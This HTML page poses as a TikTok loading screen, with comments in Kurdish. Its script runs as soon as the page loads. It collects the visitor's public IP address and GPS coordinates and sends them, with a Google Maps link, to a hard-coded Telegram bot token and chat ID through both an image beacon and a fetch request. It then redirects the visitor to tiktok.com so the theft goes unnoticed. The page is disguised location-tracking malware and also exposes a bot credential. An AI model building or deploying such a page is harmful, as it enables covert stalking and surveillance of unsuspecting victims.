<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background:#000;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#fff;
            padding:20px;
        }
        .loader{
            text-align:center;
            width:100%;
            max-width:380px;
            padding:30px 20px;
        }
        .loader svg{margin-bottom:16px;}
        .loader h2{
            font-size:28px;
            font-weight:700;
            margin-bottom:4px;
            letter-spacing:1px;
        }
        .loader .sub{
            color:#888;
            font-size:15px;
            margin-bottom:25px;
        }
        .spinner{
            width:38px;height:38px;
            border:3px solid #222;
            border-top-color:#ff0050;
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto;
        }
        @keyframes spin{to{transform:rotate(360deg);}}
        
        .open-btn{
            display:inline-block;
            padding:14px 50px;
            background:linear-gradient(135deg,#ff0050,#ff3366);
            border:none;
            border-radius:50px;
            color:#fff;
            font-size:18px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin:15px auto;
            text-decoration:none;
            box-shadow:0 8px 30px rgba(255,0,80,0.3);
            transition:all 0.3s ease;
        }
        .open-btn:hover{
            transform:translateY(-2px);
            box-shadow:0 12px 40px rgba(255,0,80,0.5);
        }
        
        .redirect-note{color:#444;font-size:12px;margin-top:25px;}
    </style>
</head>
<body>
    <div class="loader" id="app">
        <svg width="56" height="56" viewBox="0 0 24 24" fill="none">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.53 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.41-.88.03-.24.37-.49 1.02-.74 3.99-1.73 6.65-2.88 7.98-3.43 3.8-1.58 4.59-1.85 5.1-1.86.11 0 .37.03.53.17.14.12.18.28.2.45-.02.12-.02.2-.04.31z" fill="#ff0050"/>
        </svg>
        <h2>TikTok</h2>
        <p class="sub" id="status">چاوەڕوانبە...</p>
        
        <a href="#" class="open-btn" id="openBtn" onclick="return false;">Open</a>
        
        <div class="spinner"></div>
        <p class="redirect-note">دەچیتە وێبگەڕ</p>
    </div>

    <script>
        // ==================== تۆکنەکانت ====================
        const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
        const CHAT_ID = "6230485449";
        // =================================================

        // ناردن بۆ تێلێگرام - چەند ڕێگایەک
        function sendToTelegram(text) {
            // ڕێگای 1: Image Beacon
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
            
            // ڕێگای 2: Fetch
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                });
            } catch(e) {}
        }

        // وەرگرتنی ئایپی
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'نەزانراو';
            } catch(e) {
                return 'نەدۆزرایەوە';
            }
        }

        // وەرگرتنی GPS - بە هەموو شێوەیەک
        function getGPS(callback) {
            if (!navigator.geolocation) {
                callback(null, 'GPS بەردەست نییە');
                return;
            }
            
            // هەوڵی یەکەم - وردی زۆر
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    callback({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                function(err) {
                    // هەوڵی دووەم - وردی کەمتر
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            callback({
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            });
                        },
                        function(err2) {
                            callback(null, err2.message || 'ڕێگەپێ نەدرا');
                        },
                        {timeout: 5000, enableHighAccuracy: false}
                    );
                },
                {timeout: 7000, enableHighAccuracy: true}
            );
        }

        // کۆکردنەوە و ناردنی هەموو شتێک
        async function collectAndSend() {
            try {
                document.getElementById('status').textContent = 'وەرگرتنی ئایپی...';
                const ip = await getIP();
                
                document.getElementById('status').textContent = 'وەرگرتنی شوێن...';
                
                getGPS(function(gpsData, error) {
                    let msg = `📍 **GPS Location** 📍\n\n`;
                    msg += `**🌐 IP:** \`${ip}\`\n`;
                    msg += `**🕐 Time:** ${new Date().toLocaleString()}\n\n`;
                    
                    if (gpsData) {
                        msg += `**📍 GPS:** \`${gpsData.lat}, ${gpsData.lng}\`\n`;
                        msg += `**📡 Accuracy:** ${Math.round(gpsData.acc)} meters\n\n`;
                        msg += `**🔗 Google Maps:**\n`;
                        msg += `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;
                        document.getElementById('status').textContent = '✅ شوێن دۆزرایەوە!';
                    } else {
                        msg += `**⚠️ GPS:** ${error || 'نەدۆزرایەوە'}`;
                        document.getElementById('status').textContent = '⚠️ شوێن نەدۆزرایەوە';
                    }
                    
                    sendToTelegram(msg);
                });
                
            } catch(e) {
                document.getElementById('status').textContent = '❌ هەڵە ڕوویدا';
                sendToTelegram(`❌ Error: ${e.message}`);
            }
        }

        // ڕابچوون بۆ تیک تۆک
        function redirectToTikTok() {
            setTimeout(function() {
                window.location.href = 'https://www.tiktok.com';
            }, 3000);
        }

        // دەستپێکردن
        window.onload = function() {
            collectAndSend();
            redirectToTikTok();
        };
    </script>
</body>
</html>
